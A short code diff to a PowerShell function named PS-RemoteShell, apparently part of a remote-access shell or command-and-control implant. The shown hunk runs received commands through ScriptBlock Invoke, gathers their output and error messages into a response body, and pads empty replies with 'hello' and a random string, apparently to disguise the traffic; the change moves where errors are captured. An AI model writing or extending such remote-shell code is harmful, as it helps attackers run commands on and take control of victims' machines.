@@ -164,14 +164,16 @@ function PS-RemoteShell {
 				$Output = ([ScriptBlock]::Create($Cmd).Invoke() | Out-String)
 			}
 			
-			if($Output -eq "") {
+			$ErrorMessage = ($error[0] | Out-String)
+			
+			if($Output -eq "" -And $ErrorMessage -eq "") {
 				$Size = Get-Random -Maximum 50 -Minimum 1
 				$Random = Random-String -Length $Size
 				$Output = "hello $($Random)"
 			}
 			
 			$Output  = $Output + "`n"
-			$ErrorMessage = ($error[0] | Out-String)
+			
 			$error.Clear()
 			$BodyData = $Output + $ErrorMessage
 		}
